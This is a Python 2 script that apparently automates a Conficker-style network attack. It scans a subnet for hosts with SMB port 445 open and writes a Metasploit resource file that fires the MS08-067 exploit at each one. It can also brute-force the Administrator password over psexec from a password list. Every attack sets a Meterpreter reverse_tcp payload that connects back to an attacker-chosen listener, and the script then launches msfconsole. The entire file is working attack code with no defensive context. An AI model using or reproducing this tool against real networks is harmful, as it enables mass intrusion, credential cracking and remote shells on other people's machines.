#!/usr/bin/python
import sys
import os
import nmap
import optparse

def findTargets(subNet):
	nmScan=nmap.PortScanner()
	nmScan.scan(subNet,'445')
	tHosts=[]
	for host in nmScan.all_hosts():
		if nmScan[host].has_tcp(445):
			state=nmScan[host]['tcp'][445]['state']
			if state=='open':
				print '[+] Found Target Host: '+host
				tHosts.append(host)
	return tHosts

def setupHandler(configFile,lhost,lport):
	configFile.write('use exploit/multi/handler\n')
	configFile.write('set payload windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT '+str(lport)+'\n')
	configFile.write('set LHOST '+lhost+'\n')
	configFile.write('exploit -j -z\n')
	configFile.write('set DisablePayloadHandler 1\n')

def confickerExploit(configFile,tHost,lhost,lport):
	configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
	configFile.write('set RHOST '+str(tHost)+'\n')
	configFile.write('set payload windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT '+str(lport)+'\n')
	configFile.write('set LHOST '+lhost+'\n')
	configFile.write('exploit -j -z\n')

def smbBrute(configFile,tHost,passwdFile,lhost,lport):
	username='Administrator'
	pF=open(passwdFile,'r')
	for password in pF.readlines():
		password=password.strip('\r').strip('\n')
		configFile.write('use exploit/windows/smb/psexec\n')
		configFile.write('set SMBUser '+str(username)+'\n')
		configFile.write('set SMBPass '+str(password)+'\n')
		configFile.write('set RHOST '+str(tHost)+'\n')
		configFile.write('set payload windows/meterpreter/reverse_tcp\n')
		configFile.write('set LPORT '+str(lport)+'\n')
		configFile.write('set LHOST '+lhost+'\n')
		configFile.write('exploit -j -z\n')

def main():
	configFile=open('meta.rc','w')
	parser=optparse.OptionParser('Usage : ./conficker.py -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
	parser.add_option('-H',dest='tRhost',type='string',help='specify the target host[s]')
	parser.add_option('-l',dest='tLhost',type='string',help='specify the listen host')
	parser.add_option('-p',dest='tLport',type='string',help='specify the listen port')
	parser.add_option('-F',dest='tFile',type='string',help='specify the password file')
	(options,args)=parser.parse_args()
	if (options.tRhost==None)|(options.tLhost==None):
		print parser.usage
		exit(0)
	lhost=options.tLhost
	lport=options.tLport
	if lport==None:
		lport='1337'
	passwdFile=options.tFile
	tHosts=findTargets(options.tRhost)
	setupHandler(configFile,lhost,lport)
	for tHost in tHosts:
		confickerExploit(configFile,tHost,lhost,lport)
		if passwdFile!=None:
			smbBrute(configFile,tHost,passwdFile,lhost,lport)
	configFile.close()
	os.system('msfconsole -r meta.rc')
	
if __name__ == '__main__':
	main()
